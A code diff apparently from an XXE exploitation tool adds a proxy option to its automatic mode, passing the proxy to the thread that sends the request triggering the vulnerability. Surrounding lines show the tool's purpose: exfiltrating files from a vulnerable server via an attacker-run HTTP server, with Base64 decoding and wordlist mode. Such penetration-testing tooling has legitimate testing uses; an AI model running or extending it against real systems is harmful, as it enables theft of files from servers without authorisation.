@@ -28,6 +28,7 @@ def parse_args():
 	parser.add_argument('-r', '--requestfile', help='Use JSON request file for automatic mode (to automatically trigger the request to vulnerable server)')
 	parser.add_argument('-b', '--base64', help='Convert exfiltrated content from Base64', action='store_const', const=True)
 	parser.add_argument('-d', '--delay', help='Delay in seconds between files exfiltrated in wordlist mode (to avoid DoS)', type=float)
+	parser.add_argument('-p', '--proxy', help='Add proxy (in format <PROT>://<IP_OR_HOSTNAME>:<PORT>)')
 
 	return parser.parse_args()
 
@@ -43,6 +44,8 @@ def exfiltrate(args):
 
 	# automatic mode with requestfile enabled
 	if args.requestfile is not None:
+		proxy = (args.proxy if args.proxy is None else {'http' : args.proxy, 'https' : args.proxy})
+
 		if args.firsttime:
 			# check if it is safe to bind before starting HTTP server thread, if an exception is encountered exit before starting thread
 			exc_httpsrv = check_bindport(args.server, args.http_port)
@@ -58,7 +61,7 @@ def exfiltrate(args):
 		print('[*] Sending {} request to "{}" for triggering the vulnerability'.format(req_parsed['method'], req_parsed['url']))
 
 		# send the request asynchronously: do not wait for response, just trigger the XXE vulnerability
-		Thread(target=async_request, args=(req_parsed,), daemon=True).start()
+		Thread(target=async_request, args=(req_parsed, proxy), daemon=True).start()
 
 	# normal single-threaded mode, the server will wait until request is manually sent by the attacker
 	else:
